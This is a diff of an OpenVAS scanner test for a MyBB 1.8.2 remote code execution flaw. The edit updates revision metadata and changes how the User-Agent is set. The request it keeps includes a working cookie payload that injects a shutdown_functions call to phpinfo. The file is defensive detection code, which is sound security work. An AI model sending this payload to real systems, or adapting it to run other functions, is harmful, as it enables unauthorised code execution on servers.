@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mybb_rce_11_14.nasl 11108 2018-08-24 14:27:07Z mmartin $
+# $Id: gb_mybb_rce_11_14.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # MyBB <= 1.8.2 Remote Code Execution
 #
@@ -32,9 +32,9 @@ if(description)
   script_oid("1.3.6.1.4.1.25623.1.0.105122");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 11108 $");
+  script_version("$Revision: 11222 $");
   script_name("MyBB <= 1.8.2 Remote Code Execution ");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-11-24 11:50:21 +0100 (Mon, 24 Nov 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -70,10 +70,11 @@ include("host_details.inc");
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
+useragent = get_http_user_agent();
 host = http_host_name(port:port);
 
 req = 'GET ' + dir + '/ HTTP/1.1\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+      'User-Agent: ' + useragent + '\r\n' +
       'Host: ' + host + '\r\n' +
       'Cookie: GLOBALS=1; shutdown_functions[0][function]=phpinfo; shutdown_functions[0][arguments][]=-1\r\n' +
       '\r\n';
